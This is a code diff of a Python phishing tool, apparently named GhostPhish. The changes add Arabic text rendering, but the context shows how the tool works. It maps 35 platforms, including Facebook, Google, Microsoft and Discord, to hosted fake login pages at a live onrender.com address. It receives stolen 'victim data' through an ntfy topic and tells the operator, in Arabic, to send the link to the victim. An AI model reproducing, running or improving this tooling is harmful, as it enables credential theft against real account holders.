@@ -1,4 +1,3 @@
-
 import urllib.request
 import urllib.parse
 import json
@@ -7,7 +6,28 @@ import uuid
 import threading
 import time
 import sys
+import subprocess
 
+if hasattr(sys.stdout, 'reconfigure'):
+    sys.stdout.reconfigure(encoding='utf-8')
+    sys.stderr.reconfigure(encoding='utf-8')
+if hasattr(sys.stdin, 'reconfigure'):
+    sys.stdin.reconfigure(encoding='utf-8')
+
+try:
+    import arabic_reshaper
+    from bidi.algorithm import get_display
+    ARABIC_SHAPING = True
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "arabic-reshaper", "python-bidi"])
+    import arabic_reshaper
+    from bidi.algorithm import get_display
+    ARABIC_SHAPING = True
+
+def ar(text):
+    if not ARABIC_SHAPING:
+        return text
+    return get_display(arabic_reshaper.reshape(text))
 
 ORANGE = "\033[38;5;208m"
 RED = '\033[91m'
@@ -15,9 +35,7 @@ WHITE = '\033[97m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
-
 CONFIG_FILE = "ghostphish_config.json"
-
 
 PLATFORMS = {
     1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
@@ -28,7 +46,6 @@ PLATFORMS = {
     26: "Wordpress", 27: "Yandex", 28: "Stackover", 29: "Vk", 30: "XBOX",
     31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
 }
-
 
 LINKS = {
     1: "https://s-djbh.onrender.com/facebook.html",
@@ -105,7 +122,7 @@ def print_banner():
     print(WHITE + "[–] Tool Created by htr-tech (General)" + RESET)
     print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
     print()
-    print(ORANGE + "الشبح" + RESET)
+    print(ORANGE + ar("الشبح") + RESET)
     print()
 
 def print_menu():
@@ -123,7 +140,7 @@ def print_menu():
 
 def display_victim_data(message):
     print("\n" + WHITE + "═" * 40 + RESET)
-    print(WHITE + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
+    print(WHITE + BOLD + ar("  📩 بيانات ضحية جديدة") + RESET)
     print(WHITE + "═" * 40 + RESET)
     lines = message.strip().split('\n')
     for line in lines:
@@ -132,9 +149,9 @@ def display_victim_data(message):
             continue
         if ':' in line:
             key, val = line.split(':', 1)
-            print(f"{WHITE}{BOLD}{key.strip()}{RESET}: {WHITE}{val.strip()}{RESET}")
+            print(WHITE + BOLD + ar(key.strip()) + RESET + ": " + WHITE + ar(val.strip()) + RESET)
         else:
-            print(f"{WHITE}{line}{RESET}")
+            print(WHITE + ar(line) + RESET)
     print(WHITE + "═" * 40 + RESET + "\n")
 
 def listen_ntfy(topic):
@@ -158,7 +175,7 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}")
+    print(WHITE + ar("🔑 مفتاحك السري: ") + ORANGE + secret + RESET)
     print()
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
@@ -168,7 +185,7 @@ def main():
         choice = input().strip()
 
         if choice == "00" or choice == "0":
-            print(f"{WHITE}إيقاف الأداة...{RESET}")
+            print(WHITE + ar("إيقاف الأداة...") + RESET)
             sys.exit(0)
 
         if choice.isdigit():
@@ -177,8 +194,8 @@ def main():
                 if LINKS[num] == "":
                     clear_screen()
                     print_banner()
-                    print(f"{WHITE}❌ منصة {ORANGE}{PLATFORMS[num]}{WHITE} غير مفعلة بعد.{RESET}")
-                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
+                    print(WHITE + ar("❌ منصة ") + ORANGE + PLATFORMS[num] + WHITE + ar(" غير مفعلة بعد.") + RESET)
+                    input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
                     clear_screen()
                     print_banner()
                 else:
@@ -186,25 +203,25 @@ def main():
                     clear_screen()
                     print_banner()
                     print(WHITE + "═" * 40 + RESET)
-                    print(f"{WHITE}✅ رابط {ORANGE}{PLATFORMS[num]}{WHITE}:{RESET}")
-                    print(f"{ORANGE}{BOLD}{link}{RESET}")
+                    print(WHITE + ar("✅ رابط ") + ORANGE + PLATFORMS[num] + WHITE + ":" + RESET)
+                    print(ORANGE + BOLD + link + RESET)
                     print(WHITE + "═" * 40 + RESET)
-                    print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
-                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
+                    print(WHITE + ar("انسخ الرابط وأرسله للضحية.") + RESET)
+                    input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
                     clear_screen()
                     print_banner()
             else:
                 clear_screen()
                 print_banner()
-                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 00){RESET}")
-                input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
+                print(WHITE + ar("رقم غير صحيح (استخدم 01-35 أو 00)") + RESET)
+                input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
                 clear_screen()
                 print_banner()
         else:
             clear_screen()
             print_banner()
-            print(f"{WHITE}اختيار غير مفهوم{RESET}")
-            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
+            print(WHITE + ar("اختيار غير مفهوم") + RESET)
+            input(WHITE + ar("اضغط Enter للرجوع...") + RESET)
             clear_screen()
             print_banner()
 
